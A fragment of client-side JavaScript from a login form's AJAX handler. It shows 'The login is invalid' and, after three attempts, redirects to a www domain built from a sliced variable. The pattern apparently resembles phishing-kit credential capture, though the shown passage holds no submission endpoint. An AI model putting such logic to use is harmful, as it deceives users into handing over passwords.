              if (count>=3) {
                count=0;
                window.location.replace("https://www."+my_slice);
              }
              $("#msg").show();
              $('#msg_text').html("The login is invalid");
            },
            complete: function(){
              $('#submit-btn').html('Login');
            }
          });
    });


    });
</script>
